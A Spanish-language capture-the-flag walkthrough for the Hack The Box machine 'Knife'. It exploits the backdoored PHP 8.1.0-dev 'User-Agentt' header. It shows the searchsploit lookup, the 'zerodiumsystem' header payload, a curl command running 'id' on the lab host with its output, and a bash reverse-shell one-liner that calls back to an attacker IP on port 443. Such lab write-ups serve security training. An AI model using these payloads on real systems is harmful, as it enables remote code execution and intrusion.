# VULNERABILIDADES
## Enumeración de recursos compartidos FTP
### PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution

---
Con la enunmeración se encontró una verisón de php `PHP[8.1.0-dev]`, que tiene vulnerabilidad de `User - Agentt` que se puede explotar.
```java
┌──(root㉿kali)-[/home/s3cur1ty3c]
└─# searchsploit php 8.1.0-dev
---------------------------------------------------------- ---------------------------------
 Exploit Title                                            |  Path
---------------------------------------------------------- ---------------------------------
PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution       | php/webapps/49933.py
---------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```
Examinando el archivo se pueder verificar mediante el `User-Agentt:`, se puede probar inyectando por la cabecera http.
```java
 headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
            "User-Agentt": "zerodiumsystem('" + cmd + "');"
            }
```

Se puede hacer una petición mediante la cabecera utilizando curl
```java
┌──(root㉿kali)-[/home/s3cur1ty3c/CTF/HTB/knife]
└─# curl -s -X GET http://10.10.10.242 -H "User-Agentt: zerodiumsystem('id');" | html2text
uid=1000(james) gid=1000(james) groups=1000(james)
    * About EMA
    * /
    * Patients
    * /
    * Hospitals
    * /
    * Providers
    * /
    * E-MSO

***** At EMA we're taking care to a whole new level . . . *****
****** Taking care of our  ******
```
### Detalles
> * **-s.-** Ejecutar modo silencioso.
> * **-X.-** Es parametro cuando se va especificar petición http.
> * **-H.-** Para enviar una petición mediante las cabeceras.
> * **-html2text.-** Para preformatear a la petición html

Se puede ejecutar una shell reversa mediante la ejecución de comandos, cabe recordar que se debe escapar las comillas.
```java
┌──(root㉿kali)-[/home/s3cur1ty3c/CTF/HTB/knife]
└─# curl -s -X GET http://10.10.10.242 -H "User-Agentt: zerodiumsystem('bash -c \"bash -i >& /dev/tcp/10.10.16.15/443 0>&1 \"');" 
```